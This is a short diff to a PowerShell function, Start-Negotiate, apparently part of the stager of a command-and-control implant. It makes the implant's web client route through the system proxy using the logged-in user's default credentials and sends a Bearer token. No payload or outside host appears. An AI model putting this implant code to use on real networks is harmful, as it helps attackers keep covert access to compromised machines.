@@ -193,7 +193,12 @@ function Start-Negotiate {
 
     Start-Sleep -Seconds $($PI -as [Int]);
     $wc2=New-Object System.Net.WebClient;
-    $wc2.Proxy = $script:Proxy;
+    $wc2.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
+    $wc2.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
+    if($Script:Proxy) {
+        $wc2.Proxy = $Script:Proxy;
+    }
+    
     $wc2.Headers.Add("User-Agent",$UA);
     $wc2.Headers.Add("Authorization", "Bearer $T");
     $wc2.Headers.Add("Content-Type", " application/json");
